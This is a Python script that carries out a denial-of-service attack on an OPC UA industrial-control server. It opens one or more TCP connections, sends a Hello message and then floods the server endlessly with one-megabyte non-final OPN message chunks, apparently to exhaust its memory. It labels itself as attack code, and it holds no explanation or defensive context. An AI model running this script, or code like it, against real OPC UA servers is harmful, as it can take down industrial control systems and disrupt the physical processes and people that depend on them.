#!/usr/bin/env python3
import os, socket, struct, threading, time

# Build OPC UA Hello message
def ua_hello():
    h = b"HELF" + struct.pack("<I", 0) + struct.pack("<6I", 0, 0xffff, 0xffff, 0x400000, 0xffffffff, 0)
    return h[:4] + struct.pack("<I", len(h)) + h[8:]

# Build non-final OPN chunk
def ua_opn_chunk(size, seq, rid):
    p = b"OPNC" + struct.pack("<3I", 0, 0, 0) + struct.pack("<3i2I", 0, 0, 0, seq, rid) + b"A" * size
    return p[:4] + struct.pack("<I", len(p)) + p[8:]

# Attack function
def attack(host, port, chunk_size, sleep, log_every, idx):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.settimeout(5)
        s.connect((host, port))
        s.sendall(ua_hello())
        try: s.recv(8)
        except: pass
        s.settimeout(None)
        seq = sent = 0
        while True:
            s.sendall(ua_opn_chunk(chunk_size, seq, 1))
            seq += 1
            sent += 1
            if log_every and sent % log_every == 0:
                print(f"[{idx}] {sent} chunks Ã— {chunk_size}B")
            if sleep: time.sleep(sleep)
    except Exception as e:
        print(f"[{idx}] {e}")
    finally:
        try: s.close()
        except: pass

def main() -> None:
    host = os.getenv("HOST", "opcua-server")
    port = int(os.getenv("PORT", "4840"))
    conns = int(os.getenv("CONNECTIONS", "1"))
    size = int(os.getenv("CHUNK_SIZE", "1048576"))
    sleep = float(os.getenv("SLEEP_BETWEEN", "0"))
    log = int(os.getenv("LOG_EVERY", "100"))

    print(f"Attacking {host}:{port} ({conns} conns, {size}B chunks)")
    threads = [threading.Thread(target=attack, args=(host, port, size, sleep, log, i)) for i in range(conns)]
    for t in threads: t.start()
    for t in threads: t.join()


if __name__ == "__main__":
    main()
